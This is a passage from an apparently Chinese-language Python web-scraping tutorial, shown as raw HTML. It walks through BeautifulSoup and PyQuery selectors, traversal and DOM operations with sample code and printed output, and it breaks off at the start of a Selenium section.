class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)for ul in soup.select(&#39;ul&#39;):    print(ul.select(&#39;li&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;][&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;]</code></pre><h4 id="2-获取属性-1"><a href="#2-获取属性-1" class="headerlink" title="(2)获取属性"></a><strong>(2)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)for ul in soup.select(&#39;ul&#39;):    print(ul[&#39;id&#39;])    print(ul.attrs[&#39;id&#39;])</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">list-1list-1list-2list-2</code></pre><h4 id="3-获取内容-1"><a href="#3-获取内容-1" class="headerlink" title="(3)获取内容"></a><strong>(3)获取内容</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)for li in soup.select(&#39;li&#39;):    print(li.get_text())</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">FooBarJayFooBar</code></pre><h2 id="0X07-PyQuery"><a href="#0X07-PyQuery" class="headerlink" title="0X07 PyQuery"></a><strong>0X07 PyQuery</strong></h2><p>PyQuery 是另一个比较强大的网页解析库，语法完全从 jQuery 迁移过来，所以对于熟悉 JQuery 的开发人员来说是非常好的选择</p><h3 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1.初始化"></a><strong>1.初始化</strong></h3><h4 id="1-字符串初始化"><a href="#1-字符串初始化" class="headerlink" title="(1)字符串初始化"></a><strong>(1)字符串初始化</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div&gt;    &lt;ul&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)print(doc(&#39;li&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;&lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;</code></pre><h4 id="2-URL初始化"><a href="#2-URL初始化" class="headerlink" title="(2)URL初始化"></a><strong>(2)URL初始化</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">from pyquery import PyQuery as pqdoc = pq(url=&#39;http://www.baidu.com&#39;)print(doc(&#39;head&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;/&gt;&lt;meta content=&quot;always&quot; name=&quot;referrer&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css&quot;/&gt;&lt;title&gt;ç¾åº¦ä¸ä¸ï¼ä½ å°±ç¥é&lt;/title&gt;&lt;/head&gt;</code></pre><h4 id="3-文件初始化"><a href="#3-文件初始化" class="headerlink" title="(3)文件初始化"></a><strong>(3)文件初始化</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">from pyquery import PyQuery as pqdoc = pq(filename=&#39;demo.html&#39;)print(doc(&#39;li&#39;))</code></pre><h3 id="2-基本CSS选择器"><a href="#2-基本CSS选择器" class="headerlink" title="2.基本CSS选择器"></a><strong>2.基本CSS选择器</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)print(doc(&#39;#container .list li&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;&lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;</code></pre><h3 id="3-查找元素"><a href="#3-查找元素" class="headerlink" title="3.查找元素"></a><strong>3.查找元素</strong></h3><h4 id="1-子元素"><a href="#1-子元素" class="headerlink" title="(1)子元素"></a><strong>(1)子元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&#39;.list&#39;).find(&#39;li&#39;)print(li)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;&lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     </code></pre><p>当然，除了使用 find 方法以外，我们还能使用 children 方法</p><p><strong>实例代码二：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)items = doc(&#39;.list&#39;)lis = items.children(&#39;.active&#39;)print(lis)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         </code></pre><h4 id="2-父元素"><a href="#2-父元素" class="headerlink" title="(2)父元素"></a><strong>(2)父元素</strong></h4><p><strong>实例代码一：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)items = doc(&#39;.list&#39;)container = items.parent()print(container)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;div id=&quot;container&quot;&gt;    &lt;ul class=&quot;list&quot;&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;</code></pre><p>使用 parent() 是返回直接父节点，但是使用 parents()能返回全部的父节点</p><p><strong>实例代码二：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)items = doc(&#39;.list&#39;)parents = items.parents(&#39;.wrap&#39;)print(parents)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;</code></pre><h4 id="3-兄弟节点"><a href="#3-兄弟节点" class="headerlink" title="(3)兄弟节点"></a><strong>(3)兄弟节点</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&#39;.list .item-0.active&#39;)print(li.siblings(&#39;.active&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</code></pre><h3 id="4-遍历"><a href="#4-遍历" class="headerlink" title="4.遍历"></a><strong>4.遍历</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)lis = doc(&#39;li&#39;).items()for i in lis:    print(i)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;</code></pre><h3 id="5-获取信息"><a href="#5-获取信息" class="headerlink" title="5.获取信息"></a><strong>5.获取信息</strong></h3><h4 id="1-获取属性"><a href="#1-获取属性" class="headerlink" title="(1)获取属性"></a><strong>(1)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)a = doc(&#39;.list .item-0.active a&#39;)print(a.attr.href)print(a.attr(&#39;href&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">link3.htmllink3.html</code></pre><h4 id="2-获取文本"><a href="#2-获取文本" class="headerlink" title="(2)获取文本"></a><strong>(2)获取文本</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)a = doc(&#39;.item-0.active a&#39;)print(a.text())</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">third item</code></pre><h4 id="3-获取-HTML"><a href="#3-获取-HTML" class="headerlink" title="(3)获取 HTML"></a><strong>(3)获取 HTML</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&#39;.item-0.active&#39;)print(li.html())</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;</code></pre><h3 id="6-DOM操作"><a href="#6-DOM操作" class="headerlink" title="6.DOM操作"></a><strong>6.DOM操作</strong></h3><h4 id="1-addClass、removeClass"><a href="#1-addClass、removeClass" class="headerlink" title="(1)addClass、removeClass"></a><strong>(1)addClass、removeClass</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&#39;.item-0.active&#39;)print(li)li.removeClass(&#39;active&#39;)print(li)li.addClass(&#39;active&#39;)print(li)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</code></pre><h4 id="2-attr、css"><a href="#2-attr、css" class="headerlink" title="(2)attr、css"></a><strong>(2)attr、css</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    &lt;div id=&quot;container&quot;&gt;        &lt;ul class=&quot;list&quot;&gt;             &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;             &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;         &lt;/ul&gt;     &lt;/div&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)li = doc(&#39;.item-0.active&#39;)print(li)li.attr(&#39;name&#39;,&#39;link&#39;)print(li)li.css(&#39;front-size&#39;,&#39;14px&#39;)print(li)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot; name=&quot;link&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;             &lt;li class=&quot;item-0 active&quot; name=&quot;link&quot; style=&quot;front-size: 14px&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</code></pre><h4 id="3-remove"><a href="#3-remove" class="headerlink" title="(3)remove"></a><strong>(3)remove</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &#39;&#39;&#39;&lt;div class=&quot;wrap&quot;&gt;    Hello, World    &lt;p&gt;This is a paragraph.&lt;/p&gt; &lt;/div&gt;&#39;&#39;&#39;from pyquery import PyQuery as pqdoc = pq(html)wrap = doc(&#39;.wrap&#39;)print(wrap.text())wrap.find(&#39;p&#39;).remove()print(wrap.text())</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">Hello, WorldThis is a paragraph.Hello, World</code></pre><h4 id="4-其他-1"><a href="#4-其他-1" class="headerlink" title="(4)其他"></a><strong>(4)其他</strong></h4><p><a href="https://pyquery.readthedocs.io/en/latest/api.html">https://pyquery.readthedocs.io/en/latest/api.html</a></p><h2 id="0X08-Selenium"><a href="#0X08-Selenium" class="headerlink" title="0X08 Selenium"></a><strong>0X08 Selenium</strong></h2><p>该函数库可以配合各种浏览器引擎以及 phantomJS 进行自动化测试工作，主要是为了解决 JS 动态渲染页面无法直接抓取的问题</p><h3 id="1-基本使用-1"><a href="#1-基本使用-1" class="headerlink" title="1.基本使用"></a><strong>1.基本使用</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.support.wait import WebDriverWaitbrowser = webdriver.Chrome()try:    browser.get(&#39;https://www.baidu.com&#39;)    input = browser.find_element_by_id(&#39;kw&#39;)  